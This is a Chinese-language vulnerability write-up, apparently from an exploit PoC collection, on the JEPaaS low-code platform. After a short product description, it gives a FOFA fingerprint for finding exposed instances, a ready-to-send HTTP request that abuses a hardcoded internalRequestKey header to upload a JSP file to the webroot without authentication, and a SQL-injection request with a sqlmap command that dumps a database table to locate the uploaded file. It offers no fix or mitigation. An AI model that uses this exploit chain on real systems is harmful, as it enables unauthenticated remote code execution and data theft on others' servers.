## JEPaaS低代码平台document存在文件上传致RCE漏洞

JEPaaS低代码开发平台开源版 旨在帮助企业快速实现信息化和数字化转型。该平台基于可视化开发环境，让软件开发人员和业务用户通过直观的可视化界面来构建应用程序 ，而不是传统的编写代码方式。用户可以在开发平台灵活各个图形化控件，以构建业务流程、逻辑和数据模型等所需的功能，必要时还可以添加自己的代码。该平台基于可视化开发环境，通过低代码拖拽式配置开发，大幅简化开发流程，提高开发效率。以其强大的功能和灵活性，适用于各种企业信息化管理系统的搭建，包括OA、ERP、CRM、HR等，并支持集团公司部署。JEPaaS低代码平台document/file存在文件上传漏洞，未经身份验证的远程攻击者可利用内部默认的key参数绕过权限认证上传任意文件，获取服务器权限。

## fofa

```
icon_hash="-999810473"
```

## poc

```
POST /je/document/file?bucket=webroot HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
internalRequestKey: schedule_898901212
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
 
------21909179191068471382830692394
Content-Disposition: form-data; name="files"; filename="2214.jsp"
Content-Type: image/jpeg
 
123
------21909179191068471382830692394--
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405300929469.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405300929751.png)

需要搭配sql注入跑出文件路径

### sql

```
POST /rbac/im/accessToTeanantInfo HTTP/1.1
Host: xxxxx
Accept-Language: zh-CN,zh;q=0.9
internalRequestKey: schedule_898901212
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Cookie: je-local-lang=zh_CN; JSESSIONID=155BD0DA95609068A00408ACF1326C63
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

tenantId=1
```

```
sqlmap -r 2.txt --level 3 -D "jepaas" -T "je_document_file" --dump --fresh-queries
```

